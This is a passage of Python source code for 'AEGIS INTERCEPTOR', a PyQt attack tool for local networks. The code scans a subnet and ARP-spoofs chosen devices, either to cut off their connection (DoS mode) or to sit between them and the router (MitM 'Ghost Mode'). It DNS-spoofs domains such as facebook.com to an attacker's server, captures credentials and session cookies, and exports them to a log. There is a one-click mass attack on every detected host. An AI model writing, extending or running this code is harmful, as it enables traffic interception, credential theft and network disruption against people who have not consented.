        self.proc.start()

        while self.running:
            try:
                if not self.proc.is_alive(): break
                while not self.queue.empty():
                    try:
                        item = self.queue.get_nowait()
                        if item[0] == "CRED": 
                            self.cred_found.emit(item[1], item[2], item[3])
                        elif item[0] == "HOST": 
                            self.host_info.emit(item[1], str(item[2]), str(item[3]))
                        elif item[0] == "COOKIE": 
                            self.cookie_found.emit(item[1], item[2], item[3])
                    except py_queue.Empty: break
                time.sleep(0.1)
            except: pass

    def stop(self):
        self.running = False
        if self.proc:
            self.proc.terminate()
            self.proc.join()
        self.wait()

# ==========================================
# DIALOGS
# ==========================================

class ManualTargetDialog(QDialog):
    def __init__(self, parent=None):
        super().__init__(parent)
        self.setWindowTitle("Manual Target Injection")
        self.setFixedSize(400, 200)
        self.setStyleSheet(STYLESHEET)
        layout = QVBoxLayout(self)
        form = QFormLayout()
        
        self.inp_ip = QLineEdit()
        self.inp_ip.setPlaceholderText("e.g., 192.168.1.50")
        # Tooltip for IP Input
        self.inp_ip.setToolTip("Enter the specific IPv4 address of the target device you wish to intercept.")
        
        self.inp_mac = QLineEdit()
        self.inp_mac.setPlaceholderText("Optional")
        # Tooltip for MAC Input
        self.inp_mac.setToolTip("Optional: If left empty, AEGIS will attempt to automatically resolve the MAC address via ARP.")
        
        form.addRow("Target IP:", self.inp_ip)
        form.addRow("Target MAC:", self.inp_mac)
        btns = QDialogButtonBox(QDialogButtonBox.StandardButton.Ok | QDialogButtonBox.StandardButton.Cancel)
        btns.accepted.connect(self.validate_and_accept)
        btns.rejected.connect(self.reject)
        
        layout.addWidget(QLabel("Inject a target directly into the attack engine."))
        layout.addLayout(form)
        layout.addWidget(btns)

    def validate_and_accept(self):
        if not self.inp_ip.text().strip():
            QMessageBox.warning(self, "Input Error", "IP Address is required.")
            return
        self.accept()

    def get_data(self): 
        return self.inp_ip.text().strip(), self.inp_mac.text().strip()


class SettingsDialog(QDialog):
    def __init__(self, settings, parent=None):
        super().__init__(parent)
        self.setWindowTitle("System Configuration")
        self.setFixedSize(550, 450)
        self.settings = settings
        self.setStyleSheet(STYLESHEET)
        
        layout = QVBoxLayout(self)
        self.tabs = QTabWidget()
        
        # --- TAB 1: INJECTION ---
        tab_inj = QWidget()
        l_inj = QVBoxLayout(tab_inj)
        grp_att = QGroupBox("Attack Parameters")
        form_att = QFormLayout()
        
        self.combo_aggro = QComboBox()
        self.combo_aggro.addItems(["Stealth (2.0s)", "Standard (0.5s)", "Chaos (0.05s)"])
        self.combo_aggro.setCurrentText(settings.get("aggression", "Standard (0.5s)"))
        # Tooltip: Aggression Level
        self.combo_aggro.setToolTip(
            "Determines the frequency of ARP spoofing packets.\n"
            "Standard: Balanced (Recommended).\n"
            "Chaos: High frequency, stronger hold but creates significant network noise."
        )
        
        self.chk_safe = QCheckBox("Gateway Safe Mode")
        self.chk_safe.setChecked(settings.get("safe_mode", True))
        # Tooltip: Safe Mode
        self.chk_safe.setToolTip(
            "Prevents the application from targeting the Router/Gateway IP.\n"
            "Disabling this may cause the entire network's internet connection to drop."
        )
        
        self.chk_surgical = QCheckBox("Surgical DoS")
        self.chk_surgical.setChecked(settings.get("surgical_dos", True))
        # Tooltip: Surgical DoS
        self.chk_surgical.setToolTip(
            "Sends controlled micro-bursts to disconnect the target without flooding the network interface.\n"
            "More efficient and stealthier than standard flooding."
        )
        
        form_att.addRow("Pulse Interval:", self.combo_aggro)
        form_att.addRow("", self.chk_safe)
        form_att.addRow("", self.chk_surgical)
        grp_att.setLayout(form_att)
        l_inj.addWidget(grp_att)
        l_inj.addStretch()
        
        # --- TAB 2: DNS DISTORTION ---
        tab_dns = QWidget()
        l_dns = QVBoxLayout(tab_dns)
        grp_dns = QGroupBox("DNS Spoofing Configuration")
        form_dns = QFormLayout()
        
        self.chk_dns_all = QCheckBox("Spoof ALL Domains (Wildcard)")
        self.chk_dns_all.setChecked(settings.get("dns_spoof_all", False))
        # Tooltip: Wildcard DNS
        self.chk_dns_all.setToolTip(
            "WARNING: If checked, EVERY DNS request from the target will be redirected.\n"
            "This breaks internet access for the target unless you handle all traffic."
        )
        
        self.inp_redirect = QLineEdit()
        self.inp_redirect.setText(settings.get("dns_redirect_ip", parent.engine.my_ip if parent else "127.0.0.1"))
        self.inp_redirect.setPlaceholderText("IP Address (e.g. your IP)")
        # Tooltip: Redirect IP
        self.inp_redirect.setToolTip(
            "The IP address where victims will be sent when they request a spoofed domain.\n"
            "Ensure you have a web server running on this IP."
        )
        
        self.txt_domains = QTextEdit()
        self.txt_domains.setPlaceholderText("facebook.com\ngoogle.com\ninstagram.com")
        self.txt_domains.setPlainText(settings.get("dns_domains", ""))
        self.txt_domains.setFixedHeight(100)
        # Tooltip: Domain List
        self.txt_domains.setToolTip(
            "List of specific domains to spoof (one per line).\n"
            "Ignored if 'Spoof ALL Domains' is enabled."
        )
        
        form_dns.addRow("", self.chk_dns_all)
        form_dns.addRow("Redirect To:", self.inp_redirect)
        form_dns.addRow("Target Domains:", self.txt_domains)
        grp_dns.setLayout(form_dns)
        l_dns.addWidget(grp_dns)
        l_dns.addWidget(QLabel("Note: Ensure you have a web server running on the Redirect IP."))
        l_dns.addStretch()

        # --- TAB 3: PERFORMANCE ---
        tab_perf = QWidget()
        l_perf = QVBoxLayout(tab_perf)
        grp_scan = QGroupBox("Scanner Engine")
        form_scan = QFormLayout()
        
        self.spin_threads = QSpinBox()
        self.spin_threads.setRange(10, 500)
        self.spin_threads.setValue(settings.get("threads", 150))
        # Tooltip: Threads
        self.spin_threads.setToolTip(
            "Number of concurrent threads used during network scanning.\n"
            "Higher = faster scan, but consumes more CPU/Network resources."
        )
        
        self.chk_mon = QCheckBox("Enable Passive OS Fingerprinting")
        self.chk_mon.setChecked(settings.get("monitoring", True))
        # Tooltip: Passive OS
        self.chk_mon.setToolTip(
            "Analyzes packet TTL and payload signatures to guess the target's Operating System\n"
            "without sending active probes."
        )
        
        form_scan.addRow("Concurrent Tasks:", self.spin_threads)
        form_scan.addRow("", self.chk_mon)
        grp_scan.setLayout(form_scan)
        l_perf.addWidget(grp_scan); l_perf.addStretch()

        self.tabs.addTab(tab_inj, "Injection")
        self.tabs.addTab(tab_dns, "DNS Distortion")
        self.tabs.addTab(tab_perf, "Performance")
        
        layout.addWidget(self.tabs)
        btn_save = QPushButton("APPLY & SAVE")
        btn_save.clicked.connect(self.accept)
        btn_box = QHBoxLayout()
        btn_box.addStretch(); btn_box.addWidget(btn_save)
        layout.addLayout(btn_box)

    def get_settings(self):
        return {
            "aggression": self.combo_aggro.currentText(),
            "safe_mode": self.chk_safe.isChecked(),
            "surgical_dos": self.chk_surgical.isChecked(),
            "monitoring": self.chk_mon.isChecked(),
            "threads": self.spin_threads.value(),
            "dns_spoof_all": self.chk_dns_all.isChecked(),
            "dns_redirect_ip": self.inp_redirect.text(),
            "dns_domains": self.txt_domains.toPlainText()
        }

# ==========================================
# MAIN WINDOW
# ==========================================

class AegisWindow(QMainWindow):
    update_gateway_signal = pyqtSignal(str)
    log_signal = pyqtSignal(str)

    def __init__(self):
        super().__init__()
        self.setWindowTitle("AEGIS INTERCEPTOR v1.0 - 2025")
        self.resize(1200, 800)
        self.settings = ConfigManager.load()
        self.scanned_devices = {}
        self.jailed_devices = {}
        self.latency_history = collections.defaultdict(lambda: collections.deque([0]*100, maxlen=100))
        self.selected_target_ip = None
        self.dns_spoofer = None

        try:
            self.engine = ZeroCopyEngine(log_callback=self.add_system_log)
            if SCAPY_AVAILABLE and not self.engine.my_ip:
                raise RuntimeError("No network interface")
        except Exception as e:
            QMessageBox.critical(self, "Error", str(e))
            sys.exit(1)

        if SCAPY_AVAILABLE:
            self.gateway_ip = conf.route.route("0.0.0.0")[2]
        else:
            self.gateway_ip = "192.168.1.1" 
        self.gateway_mac = "ff:ff:ff:ff:ff:ff"

        self.arp_guard = ReactiveArpGuard(self.engine)
        self.proto_slayer = ProtocolSlayer(self.engine.interface_name, self.engine.my_ip, self.gateway_ip)
        self.health_mon = TargetHealthMonitor()
        
        self.health_mon.status_update.connect(self.update_target_health)
        self.health_mon.latency_update.connect(self.update_latency_visuals)
        self.arp_guard.log_signal.connect(self.add_system_log)
        self.log_signal.connect(self.add_system_log)

        self.arp_guard.start()
        self.proto_slayer.start()
        self.health_mon.start()

        self.sniffer = ProcessSniffer(self.engine.interface_name, self.settings)
        self.sniffer.cred_found.connect(self.log_credential)
        self.sniffer.host_info.connect(self.update_host_info)
        self.sniffer.cookie_found.connect(self.log_cookie)
        self.sniffer.start()

        self.init_ui()
        self.add_system_log(f"AEGIS Ready -> {self.engine.interface_name} ({self.engine.my_ip})")
        
        threading.Thread(target=self.resolve_gateway, daemon=True).start()
        
        # Reset any lingering forwarding rules on startup
        threading.Thread(target=self._async_toggle_forwarding, args=(False,), daemon=True).start()

    def create_table(self, headers):
        t = QTableWidget()
        t.setColumnCount(len(headers))
        t.setHorizontalHeaderLabels(headers)
        if t.horizontalHeader():
            t.horizontalHeader().setSectionResizeMode(QHeaderView.ResizeMode.Stretch)
        t.verticalHeader().setVisible(False)
        t.setShowGrid(False)
        t.setSelectionBehavior(QTableWidget.SelectionBehavior.SelectRows)
        return t

    def init_ui(self):
        self.setStyleSheet(STYLESHEET)
        central = QWidget()
        self.setCentralWidget(central)
        main_layout = QVBoxLayout(central)
        main_layout.setContentsMargins(0, 0, 0, 0)

        # --- HEADER SECTION ---
        header = QFrame(); header.setObjectName("Header"); header.setFixedHeight(80)
        hbox = QHBoxLayout(header)
        title = QLabel("AEGIS INTERCEPTOR"); title.setObjectName("Logo")
        self.lbl_status = QLabel(f"IFACE: {self.engine.interface_name} | {self.engine.my_ip}"); self.lbl_status.setObjectName("Sub")
        left = QVBoxLayout(); left.addWidget(title); left.addWidget(self.lbl_status)
        
        controls = QHBoxLayout()
        
        # Mode Selector with Tooltip
        self.combo_mode = QComboBox()
        self.combo_mode.addItems(["⛔ Denial of Service (Kill)", "👻 Ghost Mode (MitM + Sniff)"])
        self.combo_mode.setFixedWidth(240)
        self.combo_mode.currentIndexChanged.connect(self.toggle_attack_mode)
        self.combo_mode.setToolTip(
            "<b>DoS Mode:</b> Cuts target internet by dropping packets.<br>"
            "<b>Ghost Mode:</b> Forwards packets to router, allowing Sniffing & DNS Spoofing."
        )
        
        # DNS Checkbox with Tooltip
        self.chk_enable_dns = QCheckBox("DNS SPOOF")
        self.chk_enable_dns.setToolTip("Activates the DNS Distortion Field based on Settings.\nRequires Ghost Mode.")
        self.chk_enable_dns.setStyleSheet(f"color: {THEME['accent']}; font-weight: bold;")
        self.chk_enable_dns.toggled.connect(self.toggle_dns_module)

        # Scan Buttons with Tooltips
        self.btn_scan = QPushButton("ASYNC SCAN")
        self.btn_scan.clicked.connect(self.start_scan)
        self.btn_scan.setToolTip("Runs a deep, asynchronous scan of the local subnet.\nIdentifies vendors and OS types.")
        
        self.btn_fast_scan = QPushButton("FAST SCAN")
        self.btn_fast_scan.clicked.connect(self.start_fast_scan)
        self.btn_fast_scan.setToolTip("Quickly sweeps common ports to find active IPs.\nFaster but less detailed.")
        
        self.btn_add_manual = QPushButton("+ ADD TARGET")
        self.btn_add_manual.clicked.connect(self.open_manual_add)
        self.btn_add_manual.setToolTip("Manually inject a target IP if the scanner fails to find it.")
        
        # Attack Controls with Tooltips
        btn_kill = QPushButton("KILL ALL")
        btn_kill.setProperty("class", "danger")
        btn_kill.clicked.connect(self.kill_all_targets)
        btn_kill.setToolTip("<b>WARNING:</b> Immediately intercepts/blocks ALL detected devices on the list.")
        
        btn_restore = QPushButton("RESTORE")
        btn_restore.clicked.connect(self.unkill_all_targets)
        btn_restore.setToolTip("Releases all targets and attempts to restore normal network traffic.")
        
        btn_settings = QPushButton("⚙")
        btn_settings.clicked.connect(self.open_settings)
        btn_settings.setToolTip("Configure Scanning Threads, Attack Aggression, and DNS Settings.")
        
        if not SCAPY_AVAILABLE:
            self.btn_scan.setEnabled(False); self.btn_fast_scan.setEnabled(False); btn_kill.setEnabled(False)
            self.lbl_status.setText("CRITICAL ERROR: SCAPY NOT FOUND")
            self.lbl_status.setStyleSheet("color: #f87171; font-weight: bold;")

        controls.addWidget(self.combo_mode)
        controls.addWidget(self.chk_enable_dns)
        controls.addWidget(self.btn_scan); controls.addWidget(self.btn_fast_scan)
        controls.addWidget(self.btn_add_manual); controls.addWidget(btn_kill); controls.addWidget(btn_restore); controls.addWidget(btn_settings)
        hbox.addLayout(left); hbox.addStretch(); hbox.addLayout(controls)
        main_layout.addWidget(header)

        # --- PROGRESS BAR ---
        self.progress = QProgressBar(); self.progress.setTextVisible(False); self.progress.setFixedHeight(8)
        self.progress.setStyleSheet("QProgressBar { border: 1px solid #33524e; background-color: #223f3c; height: 8px; } QProgressBar::chunk { background-color: #2dd4bf; }")
        main_layout.addWidget(self.progress)

        # --- MAIN SPLITTERS ---
        v_splitter = QSplitter(Qt.Orientation.Vertical)
        
        top_widget = QWidget()
        top_layout = QHBoxLayout(top_widget)
        top_layout.setContentsMargins(10, 10, 10, 10)
        h_splitter = QSplitter(Qt.Orientation.Horizontal)

        # Left Card: Scan Results
        left = QFrame(); left.setObjectName("Card")
        l = QVBoxLayout(left)
        l.addWidget(QLabel("DETECTED HOSTS", objectName="CardTitle"))
        self.table_scan = self.create_table(["IP Address", "MAC", "Vendor / OS", "Action"])
        self.table_scan.setToolTip("List of devices found on the network.")
        l.addWidget(self.table_scan); h_splitter.addWidget(left)

        # Middle Card: Active Targets
        mid = QFrame(); mid.setObjectName("Card")
        m = QVBoxLayout(mid)
        m.addWidget(QLabel("ACTIVE TARGETS", objectName="CardTitle"))
        self.table_kill = self.create_table(["IP Address", "MAC", "Status", "Health", "Control"])
        self.table_kill.itemSelectionChanged.connect(self.on_target_selected)
        self.table_kill.setToolTip("Devices currently being intercepted.\n<b>Select a row</b> to view its latency graph below.")
        m.addWidget(self.table_kill); h_splitter.addWidget(mid)

        # Right Card: Intel Log
        right = QFrame(); right.setObjectName("Card")
        r = QVBoxLayout(right)
        r.addWidget(QLabel("INTELLIGENCE LOG", objectName="CardTitle"))
        self.table_log = self.create_table(["Source", "Type", "Data"])
        self.table_log.setToolTip("Captured credentials, cookies, and host info.")
        r.addWidget(self.table_log); h_splitter.addWidget(right)

        h_splitter.setSizes([400, 400, 400])
        top_layout.addWidget(h_splitter)
        v_splitter.addWidget(top_widget)

        bottom_widget = QWidget()
        bottom_layout = QHBoxLayout(bottom_widget)
        bottom_layout.setContentsMargins(10, 0, 10, 10)
        bottom_splitter = QSplitter(Qt.Orientation.Horizontal)

        # System Log with Export Button
        log_frame = QFrame(); log_frame.setObjectName("Card")
        log_l = QVBoxLayout(log_frame)
        
        log_header = QHBoxLayout()
        log_header.addWidget(QLabel("SYSTEM EVENTS", objectName="CardTitle"))
        log_header.addStretch()
        
        btn_export = QPushButton("EXPORT LOG")
        btn_export.setFixedSize(100, 25)
        btn_export.setStyleSheet("font-size: 8pt; padding: 2px;") 
        btn_export.clicked.connect(self.export_logs)
        btn_export.setToolTip("Save system events and captured intel to a text file.")
        log_header.addWidget(btn_export)
        
        log_l.addLayout(log_header)

        self.log_console = QTextEdit(); self.log_console.setObjectName("SystemLog"); self.log_console.setReadOnly(True)
        log_l.addWidget(self.log_console)
        bottom_splitter.addWidget(log_frame)

        # Graph Section
        graph_frame = QFrame(); graph_frame.setObjectName("Card")
        graph_l = QVBoxLayout(graph_frame)
        graph_l.addWidget(QLabel("VISUAL SIGNAL ANALYTICS (Latency ms)", objectName="CardTitle"))
        
        if PYQTGRAPH_AVAILABLE:
            self.setup_graph(graph_l)
        else:
            lbl_err = QLabel("PyQtGraph not installed.\nRun: pip install pyqtgraph")
            lbl_err.setAlignment(Qt.AlignmentFlag.AlignCenter)
            lbl_err.setStyleSheet(f"color: {THEME['text_s']};")
            graph_l.addWidget(lbl_err)
        
        bottom_splitter.addWidget(graph_frame)
        bottom_splitter.setSizes([700, 500])
        
        bottom_layout.addWidget(bottom_splitter)
        v_splitter.addWidget(bottom_widget)
        v_splitter.setSizes([500, 250])
        main_layout.addWidget(v_splitter)

    def export_logs(self):
        filename = f"aegis_log_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        file_path, _ = QFileDialog.getSaveFileName(self, "Save Log", filename, "Text Files (*.txt)")
        
        if file_path:
            try:
                with open(file_path, 'w', encoding='utf-8') as f:
                    f.write("=== AEGIS INTERCEPTOR SYSTEM LOG ===\n")
                    f.write(f"Exported: {datetime.now()}\n\n")
                    f.write("--- SYSTEM EVENTS ---\n")
                    f.write(self.log_console.toPlainText())
                    f.write("\n\n--- INTELLIGENCE CAPTURES ---\n")
                    f.write(f"{'IP':<16} | {'TYPE':<15} | {'DATA'}\n")
                    f.write("-" * 80 + "\n")
                    
                    for r in range(self.table_log.rowCount()):
                        ip = self.table_log.item(r, 0).text()
                        ltype = self.table_log.item(r, 1).text()
                        data = self.table_log.item(r, 2).text()
                        f.write(f"{ip:<16} | {ltype:<15} | {data}\n")
                        
                self.add_system_log(f"Logs successfully exported to {file_path}")
            except Exception as e:
                QMessageBox.critical(self, "Export Error", f"Failed to save log: {str(e)}")

    def setup_graph(self, layout):
        self.plot_widget = pg.PlotWidget()
        self.plot_widget.setBackground(THEME['bg_app'])
        self.plot_widget.showGrid(x=True, y=True, alpha=0.3)
        styles = {'color': THEME['text_s'], 'font-size': '10px'}
        self.plot_widget.getPlotItem().getAxis('left').setLabel('Latency (ms)', **styles)
        self.plot_widget.getPlotItem().getAxis('bottom').setLabel('Time', **styles)
        
        pen = pg.mkPen(color=THEME['accent'], width=2)
        brush = pg.mkBrush(color=QColor(THEME['accent']))
        brush.setStyle(Qt.BrushStyle.Dense6Pattern)
        
        self.curve = self.plot_widget.plot(pen=pen, fillLevel=0, brush=brush)
        
        layout.addWidget(self.plot_widget)

    def on_target_selected(self):
        selected_items = self.table_kill.selectedItems()
        if not selected_items:
            self.selected_target_ip = None
            if PYQTGRAPH_AVAILABLE and hasattr(self, 'curve'):
                self.curve.setData([0]*100)
            return
        row = selected_items[0].row()
        ip = self.table_kill.item(row, 0).text()
        self.selected_target_ip = ip
        if PYQTGRAPH_AVAILABLE and hasattr(self, 'curve'):
            data = list(self.latency_history[ip])
            self.curve.setData(data)

    def update_latency_visuals(self, ip, latency_ms):
        self.latency_history[ip].append(latency_ms)
        if PYQTGRAPH_AVAILABLE and hasattr(self, 'curve'):
            if self.selected_target_ip == ip:
                self.curve.setData(list(self.latency_history[ip]))

    def add_system_log(self, message):
        ts = datetime.now().strftime("%H:%M:%S")
        self.log_console.append(f"[{ts}] {message}")
        sb = self.log_console.verticalScrollBar()
        if sb: sb.setValue(sb.maximum())

    def toggle_attack_mode(self, index):
        enable_forwarding = (index == 1)
        mode_name = "GHOST MODE (MitM)" if enable_forwarding else "DoS MODE (Blackhole)"
        self.add_system_log(f"Switching to {mode_name}...")
        # Run in background to prevent UI freeze
        threading.Thread(target=self._async_toggle_forwarding, args=(enable_forwarding,), daemon=True).start()

    def _async_toggle_forwarding(self, enable):
        try:
            os_type = platform.system()
            if os_type == "Linux":
                try:
                    with open("/proc/sys/net/ipv4/ip_forward", "w") as f: f.write("1" if enable else "0")
                except IOError:
                    subprocess.run(["sysctl", "-w", f"net.ipv4.ip_forward={1 if enable else 0}"], 
                                   check=False, stdout=subprocess.DEVNULL)
            elif os_type == "Darwin":
                subprocess.run(["sysctl", "-w", f"net.inet.ip.forwarding={1 if enable else 0}"], 
                               check=False, stdout=subprocess.DEVNULL)
            elif os_type == "Windows":
                status = "Enabled" if enable else "Disabled"
                cmd = f"powershell -Command \"Set-NetIPInterface -Forwarding {status}\""
                flags = subprocess.CREATE_NO_WINDOW if platform.system()=='Windows' else 0
                subprocess.run(cmd, shell=True, creationflags=flags)
            
            state = "ON" if enable else "OFF"
            self.log_signal.emit(f"System: IP Forwarding set to {state}")
        except Exception as e:
            self.log_signal.emit(f"Error toggling IP forwarding: {e}")

    def toggle_dns_module(self, active):
        if active:
            redirect_ip = self.settings.get("dns_redirect_ip", "")
            
            if not redirect_ip:
                QMessageBox.warning(self, "Configuration Error", 
                                    "Redirect IP is missing.\nPlease go to Settings -> DNS Distortion and set a redirect IP.")
                self.chk_enable_dns.setChecked(False)
                return
            
            spoof_all = self.settings.get("dns_spoof_all", False)
            raw_domains = self.settings.get("dns_domains", "")
            domain_list = [d.strip() for d in raw_domains.split('\n') if d.strip()]
            
            if not spoof_all and not domain_list:
                QMessageBox.warning(self, "DNS Config", "No target domains configured in Settings.")
                self.chk_enable_dns.setChecked(False)
                return

            self.dns_spoofer = DnsSpoofer(self.engine.interface_name, redirect_ip, domain_list, spoof_all)
            self.dns_spoofer.log_signal.connect(self.add_system_log)
            self.dns_spoofer.start()
        else:
            if self.dns_spoofer:
                self.dns_spoofer.stop()
                self.dns_spoofer = None
                self.add_system_log("[DNS] Distortion Field Deactivated.")

    def start_scan(self):
        self.btn_scan.setEnabled(False); self.btn_scan.setText("SCANNING...")
        self.add_system_log("Starting asynchronous network sweep...")
        self.progress.setValue(0)
        self.scan_worker = AsyncScanner(self.engine.my_ip, self.engine.iface_obj, self.settings)
        self.scan_worker.device_found.connect(self.add_scan_result)
        self.scan_worker.log_msg.connect(self.add_system_log)
        self.scan_worker.progress.connect(self.progress.setValue)
        self.scan_worker.finished.connect(self.on_scan_finished)
        self.scan_worker.start()

    def start_fast_scan(self):
        self.btn_fast_scan.setEnabled(False); self.btn_fast_scan.setText("SCANNING...")
        self.add_system_log("Starting fast network sweep...")
        self.progress.setValue(0)
        self.fast_worker = FastScanner(self.engine.my_ip, self.engine.iface_obj, self.settings)
        self.fast_worker.device_found.connect(self.add_scan_result)
        self.fast_worker.log_msg.connect(self.add_system_log)
        self.fast_worker.progress.connect(self.progress.setValue)
        self.fast_worker.finished.connect(self.on_fast_scan_finished)
        self.fast_worker.start()

    def on_scan_finished(self):
        self.btn_scan.setEnabled(True); self.btn_scan.setText("ASYNC SCAN")
        self.add_system_log("Async scan complete.")

    def on_fast_scan_finished(self):
        self.btn_fast_scan.setEnabled(True); self.btn_fast_scan.setText("FAST SCAN")
        self.add_system_log("Fast scan complete.")

    def add_scan_result(self, ip, mac, vendor):
        if mac in self.jailed_devices or ip == self.engine.my_ip or mac in self.scanned_devices: return
        r = self.table_scan.rowCount(); self.table_scan.insertRow(r)
        self.table_scan.setItem(r, 0, QTableWidgetItem(ip))
        self.table_scan.setItem(r, 1, QTableWidgetItem(mac))
        self.table_scan.setItem(r, 2, QTableWidgetItem(vendor))
        btn = QPushButton("INTERCEPT"); btn.setProperty("class", "danger")
        btn.clicked.connect(lambda _, i=ip, m=mac: self.kill_target(i, m))
        btn.setToolTip("Add this device to the active target list.")
        self.table_scan.setCellWidget(r, 3, btn)
        self.scanned_devices[mac] = {'ip': ip, 'row': r}

    def kill_target(self, ip, mac):
        if self.settings.get("safe_mode", True) and ip == self.gateway_ip:
            self.add_system_log(f"Blocked attack on Gateway {ip} (Safe Mode)"); return
        
        if self.gateway_mac.lower().startswith("ff:ff"):
             QMessageBox.critical(self, "Gateway Error", "Gateway MAC not resolved. Attack aborted.")
             return

        for r in range(self.table_kill.rowCount()):
            if self.table_kill.item(r, 0).text() == ip: return

        is_dos_mode = (self.combo_mode.currentIndex() == 0)
        
        self.engine.add_target(ip, mac, self.gateway_ip, self.gateway_mac, 0.5, dos_mode=is_dos_mode)
        
        if not is_dos_mode:
            self.proto_slayer.add_target(ip)
        else:
            self.add_system_log(f"Engaging Blackhole DoS on {ip}")

        self.health_mon.add_target(ip)

        r = self.table_kill.rowCount()
        self.table_kill.insertRow(r)
        self.table_kill.setItem(r, 0, QTableWidgetItem(ip))
        self.table_kill.setItem(r, 1, QTableWidgetItem(mac))
        
        status_text = "BLACKHOLE (DoS)" if is_dos_mode else "INTERCEPT (MitM)"
        status = QTableWidgetItem(status_text)
        status.setForeground(QBrush(QColor(THEME['danger'])))
        self.table_kill.setItem(r, 2, status)
        
        health = QTableWidgetItem("Initializing...")
        health.setForeground(QBrush(QColor(THEME['text_s'])))
        self.table_kill.setItem(r, 3, health)
        
        btn = QPushButton("RELEASE")
        btn.clicked.connect(lambda _, i=ip, m=mac, row=r: self.release_target(i, m, row))
        btn.setToolTip("Stop attacking this target.")
        self.table_kill.setCellWidget(r, 4, btn)
        
        self.jailed_devices[mac] = {'ip': ip, 'row': r}
        self.add_system_log(f"Target Captured: {ip}")

    def release_target(self, ip, mac, row=None):
        self.engine.remove_target(ip)
        self.proto_slayer.remove_target(ip)
        self.health_mon.remove_target(ip)
        
        if row is None:
            for r in range(self.table_kill.rowCount()):
                if self.table_kill.item(r, 0).text() == ip: row = r; break
        
        if row is not None and row < self.table_kill.rowCount():
            self.table_kill.removeRow(row)
            if mac in self.jailed_devices: del self.jailed_devices[mac]
            
        self.add_system_log(f"Target Released: {ip}")

    def update_target_health(self, ip, status_text, color_hex):
        for r in range(self.table_kill.rowCount()):
            item = self.table_kill.item(r, 0)
            if item and item.text() == ip:
                health_item = self.table_kill.item(r, 3)
                if health_item:
                    health_item.setText(status_text)
                    health_item.setForeground(QBrush(QColor(color_hex)))
                break

    def kill_all_targets(self):
        if self.gateway_mac.lower().startswith("ff:ff"):
             QMessageBox.critical(self, "Gateway Error", "Gateway MAC not resolved. Mass attack aborted.")
             return
        self.add_system_log("Executing MASS INTERCEPT.")
        for mac, data in self.scanned_devices.copy().items():
            self.kill_target(data['ip'], mac)

    def unkill_all_targets(self):
        self.add_system_log("Restoring network normality.")
        for r in range(self.table_kill.rowCount()):
            ip = self.table_kill.item(r, 0).text()
            mac = self.table_kill.item(r, 1).text()
            self.release_target(ip, mac, r)

    def resolve_gateway(self):
        if not SCAPY_AVAILABLE: return
        max_retries = 3
        for attempt in range(max_retries):
            try:
                self.add_system_log(f"Resolving gateway... ({attempt+1}/{max_retries})")
                ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=self.gateway_ip), timeout=2, verbose=0, iface=self.engine.iface_obj)
                if ans:
                    self.gateway_mac = ans[0][1].hwsrc
                    self.add_system_log(f"Gateway MAC: {self.gateway_mac}")
                    return
            except: pass
        
        self.add_system_log("Active resolution failed. Checking ARP cache...")
        cached_mac = resolve_mac_robust(self.gateway_ip)
        if cached_mac:
            self.gateway_mac = cached_mac
            self.add_system_log(f"Gateway MAC (Cached): {self.gateway_mac}")
        else:
            self.add_system_log("Gateway MAC Resolution Failed. Defaulting to Broadcast (Risky).")

    def open_manual_add(self):
        dlg = ManualTargetDialog(self)
        if dlg.exec():
            ip, mac = dlg.get_data()
            if not mac and SCAPY_AVAILABLE:
                mac = resolve_mac_robust(ip, self.engine.iface_obj)
            if mac: self.kill_target(ip, mac)
            else: QMessageBox.warning(self, "Error", "Could not resolve MAC address for this IP.")

    def open_settings(self):
        dlg = SettingsDialog(self.settings, self)
        if dlg.exec():
            self.settings = dlg.get_settings()
            ConfigManager.save(self.settings)
            self.add_system_log("Settings updated.")
            self.sniffer.stop()
            self.sniffer = ProcessSniffer(self.engine.interface_name, self.settings)
            self.sniffer.cred_found.connect(self.log_credential)
            self.sniffer.host_info.connect(self.update_host_info)
            self.sniffer.cookie_found.connect(self.log_cookie)
            self.sniffer.start()

    def log_credential(self, ip, c_type, data):
        r = self.table_log.rowCount(); self.table_log.insertRow(r)
        self.table_log.setItem(r, 0, QTableWidgetItem(ip))
        t_item = QTableWidgetItem(c_type)
        t_item.setForeground(QBrush(QColor(THEME['danger'] if "AUTH" in c_type else THEME['accent'])))
        self.table_log.setItem(r, 1, t_item)
        self.table_log.setItem(r, 2, QTableWidgetItem(data))
        self.table_log.scrollToBottom()
        if "AUTH" in c_type:
            self.add_system_log(f"CRITICAL: Captured Credential from {ip}")

    def log_cookie(self, ip, c_type, data):
        r = self.table_log.rowCount()
        self.table_log.insertRow(r)
        self.table_log.setItem(r, 0, QTableWidgetItem(ip))
        t_item = QTableWidgetItem(c_type)
        t_item.setForeground(QBrush(QColor(THEME['warn'])))  
        t_item.setToolTip("Potential Session Token")
        self.table_log.setItem(r, 1, t_item)
        d_item = QTableWidgetItem(data)
        d_item.setToolTip(data)
        self.table_log.setItem(r, 2, d_item)
        self.table_log.scrollToBottom()

    def update_host_info(self, ip, hostname, os_type):
        for mac, data in self.scanned_devices.items():
            if data['ip'] == ip:
                item = self.table_scan.item(data['row'], 2)
                if item: item.setText(f"{item.text().split()[0]}\n{os_type}")

    def closeEvent(self, event):
        self.add_system_log("Shutting down modules...")
        self.engine.stop()
        self.sniffer.stop()
        self.arp_guard.stop()
        self.proto_slayer.stop()
        self.health_mon.stop()
        if self.dns_spoofer: self.dns_spoofer.stop()
        # Reset forwarding on exit
        self.toggle_ip_forwarding(False)
        event.accept()

# ==========================================
# STARTUP LOADER (SPLASH SCREEN)
# ==========================================
class DependencyLoader(QThread):
    finished = pyqtSignal(bool)
    status = pyqtSignal(str)

    def run(self):
        self.status.emit("Initializing Core Systems...")
        time.sleep(0.5) 
        
        self.status.emit("Loading Network Drivers (Scapy)...")
        try:
            # Populate global variables dynamically to prevent slow startup
            global conf, Ether, ARP, IP, UDP, TCP, ICMP, DNS, DNSQR, DNSRR, sniff
            global get_if_hwaddr, get_if_addr, srp, send, sr1, sendp, SCAPY_AVAILABLE
            
            from scapy.config import conf
            conf.use_pcap = True
            conf.verb = 0
            from scapy.all import (Ether, ARP, IP, UDP, TCP, ICMP, DNS, DNSQR, DNSRR, 
                                   sniff, get_if_hwaddr, get_if_addr, srp, send, sr1, sendp)
            SCAPY_AVAILABLE = True
            
            self.status.emit("Network Drivers Loaded.")
        except ImportError:
            SCAPY_AVAILABLE = False
            self.status.emit("Scapy Not Found!")
        
        self.status.emit("Starting Interface Engine...")
